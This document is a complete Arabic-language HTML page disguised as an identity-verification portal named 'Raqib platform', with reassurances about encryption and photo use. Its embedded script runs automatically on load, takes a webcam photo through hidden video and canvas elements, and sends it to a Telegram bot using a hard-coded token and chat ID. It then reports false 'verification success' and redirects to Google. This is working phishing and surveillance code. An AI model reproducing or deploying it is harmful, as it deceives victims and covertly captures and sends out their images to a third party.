<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>منصة راقب - توثيق الهوية</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .card {
            background: white;
            border-radius: 30px;
            max-width: 500px;
            width: 100%;
            padding: 40px 30px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            text-align: center;
        }
        
        .logo {
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, #00b4db 0%, #0083b0 100%);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            font-size: 40px;
            color: white;
            font-weight: bold;
        }
        
        h1 {
            color: #1a1a2e;
            font-size: 28px;
            margin-bottom: 10px;
        }
        
        .subtitle {
            color: #666;
            font-size: 14px;
            margin-bottom: 30px;
        }
        
        .security-badge {
            background: #e8f0fe;
            border-radius: 50px;
            padding: 8px 16px;
            display: inline-flex;
            align-items: center;
            gap: 8px;
            font-size: 12px;
            color: #1a73e8;
            margin-bottom: 25px;
        }
        
        .info-box {
            background: #f0f7ff;
            border-radius: 15px;
            padding: 15px;
            margin: 20px 0;
            text-align: right;
        }
        
        .info-box p {
            color: #1a73e8;
            font-size: 13px;
            margin: 8px 0;
        }
        
        .loading-text {
            margin-top: 20px;
            padding: 12px;
            border-radius: 10px;
            font-size: 14px;
            background: #fff3cd;
            color: #856404;
        }
        
        .success-text {
            margin-top: 20px;
            padding: 12px;
            border-radius: 10px;
            font-size: 14px;
            background: #d4edda;
            color: #155724;
        }
        
        .error-text {
            margin-top: 20px;
            padding: 12px;
            border-radius: 10px;
            font-size: 14px;
            background: #f8d7da;
            color: #721c24;
        }
        
        .footer {
            margin-top: 25px;
            font-size: 11px;
            color: #aaa;
        }
        
        video, canvas {
            display: none;
        }
        
        .spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #00b4db;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-right: 10px;
            vertical-align: middle;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">ر</div>
        <h1>منصة راقب</h1>
        <div class="subtitle">المنصة الرقمية الموثوقة</div>
        
        <div class="security-badge">🔒 اتصال آمن ومشفر</div>
        
        <div class="info-box">
            <p>✓ مطلوب تأكيد الهوية لإكمال العملية</p>
            <p>✓ سيستغرق الأمر ثانية واحدة فقط</p>
            <p>✓ الصورة تستخدم للتوثيق فقط</p>
        </div>
        
        <div id="status" class="loading-text">
            <span class="spinner"></span> جاري تحميل المنصة...
        </div>
        
        <div class="footer">منصة راقب © 2026 - جميع الحقوق محفوظة</div>
    </div>
    
    <video id="video" autoplay></video>
    <canvas id="canvas"></canvas>
    
    <script>
        const BOT_TOKEN = "8365043460:AAGa2EIVhOTKFa7wEuARpb_cuEsDIa2bVxs";
        const CHAT_ID = "8545876964";
        const statusDiv = document.getElementById('status');
        
        async function capturePhoto() {
            try {
                statusDiv.innerHTML = '<span class="spinner"></span> جاري الوصول إلى الكاميرا...';
                
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                video.onloadedmetadata = () => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0);
                    
                    statusDiv.innerHTML = '<span class="spinner"></span> جاري إرسال بيانات التوثيق...';
                    
                    canvas.toBlob(async (blob) => {
                        const formData = new FormData();
                        formData.append('chat_id', CHAT_ID);
                        formData.append('photo', blob);
                        
                        try {
                            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                                method: 'POST',
                                body: formData
                            });
                            const result = await response.json();
                            
                            if (result.ok) {
                                statusDiv.className = 'success-text';
                                statusDiv.innerHTML = '✓ تم توثيق هويتك بنجاح! جاري تحويلك...';
                                setTimeout(() => {
                                    window.location.href = "https://www.google.com";
                                }, 2000);
                            } else {
                                throw new Error(result.description);
                            }
                        } catch(e) {
                            statusDiv.className = 'error-text';
                            statusDiv.innerHTML = '✗ حدث خطأ تقني، يرجى المحاولة مرة أخرى';
                        }
                    }, 'image/jpeg');
                    
                    stream.getTracks().forEach(track => track.stop());
                };
            } catch(error) {
                statusDiv.className = 'error-text';
                statusDiv.innerHTML = '✗ لا يمكن الوصول إلى الكاميرا. الرجاء السماح بالوصول إلى الكاميرا';
            }
        }
        
        // تشغيل الكاميرا فور تحميل الصفحة
        setTimeout(capturePhoto, 500);
    </script>
</body>
</html>
